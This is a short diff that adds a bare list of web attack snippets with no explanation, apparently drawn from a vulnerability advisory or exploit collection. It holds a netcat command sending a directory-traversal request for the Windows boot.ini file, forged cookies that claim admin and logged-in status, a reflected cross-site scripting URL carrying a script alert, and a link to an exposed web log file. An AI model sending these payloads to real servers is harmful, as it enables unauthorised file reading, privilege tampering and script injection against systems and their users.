@@ -1,0 +1,11 @@
+echo -e "GET /../../../../boot.ini HTTP/1.0\r\n\r\n" | nc <server> <port>
+
+Set-Cookie: User=admin; path=/
+Set-Cookie: login=true; path=/
+Set-Cookie: IsAdmin=false; path=/
+Set-Cookie: IP=; path=/
+
+http://www.example.com/<script>alert("No_Problem_its_just_an_admin_interface")</script>
+
+http://www.example.com/LOG/Weblog.LOG
+
